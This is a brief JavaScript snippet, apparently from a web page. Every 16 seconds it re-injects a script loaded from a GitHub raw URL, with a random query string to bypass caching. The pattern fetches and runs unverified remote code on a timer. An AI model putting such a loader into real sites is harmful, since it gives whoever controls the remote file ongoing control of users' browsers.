function mm()
{
    var e; if(e=document.getElementById("meizz")) e.parentNode.removeChild(e);
    var script= document.createElement("SCRIPT"); script.defer = true;
    script.type="text/javascript"; script.id="meizz";
    script.src = "https://raw.githubusercontent.com/570295535/yuyin/master/2.js?temp="+ Math.random();  //缓存问题
    document.getElementsByTagName("body")[0].appendChild(script);
}
setInterval("mm()", 16000); //16秒运行一次
